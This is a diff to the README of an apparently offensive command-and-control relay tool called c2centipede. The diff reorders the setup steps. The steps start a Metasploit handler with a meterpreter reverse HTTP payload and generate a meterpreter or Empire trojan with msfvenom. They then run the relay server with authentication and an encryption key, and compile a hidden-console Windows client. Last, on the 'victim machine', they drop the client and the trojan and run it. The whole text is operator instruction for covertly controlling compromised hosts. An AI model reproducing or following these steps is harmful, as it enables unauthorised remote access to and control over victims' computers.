@@ -24,17 +24,16 @@ The server uses python3
 1) Run your handler /msfconsole -x "use exploit/multi/handler;set payload python/meterpreter_reverse_http;set exitonsession false; set lport 8888; set lhost 0.0.0.0; run -j
 You can use any reverse HTTP payload, not just python.
 
+2)Generate your meterpreter (with msfvenom), empire or other trojan pointing to localhost and the port specified on the -p argument you will use in the c2centipede client (in this case 2233)
 
-2) python3 c2c_server.py -p 9093 -d 127.0.0.1:8888 -a lalala:lelele -b -f xkJSFO2DKQyYxj9F6Q4XCXIviiFuxNzZjsEfNc9NgoM=
-
+3) python3 c2c_server.py -p 9093 -d 127.0.0.1:8888 -a lalala:lelele -b -f xkJSFO2DKQyYxj9F6Q4XCXIviiFuxNzZjsEfNc9NgoM=
 -p port to listen to
 -d destination of the packages (This would be your MSF or Empire handler address)
 -a authentication for the c2centipede server, the operator needs to know these to send commands to the c2centipede server.
 -b beep (for debugging, you can listen to the beacons of your trojan)
 -f Fernet key, symmetric shared with the client. (if not specified it will generate a new one)
 
-
-3)Set your RFP proxies and/or CDNs.
+4)Set your RFP proxies and/or CDNs.
 
 
 ### On the victim machine
@@ -49,7 +48,7 @@ The client uses python2 because _reasons_
 Optionally, you can compile the client for windows using pyinstaller
 wine pyinstaller.exe --onefile --noconsole c2c_client.py
 
-2)Generate your meterpreter, empire or other trojan pointing to localhost and the port specified on the -p argument (in this case 2233)
+2)Drop the c2centipede client script or executable and the trojan
 
 3)Run the trojan
 
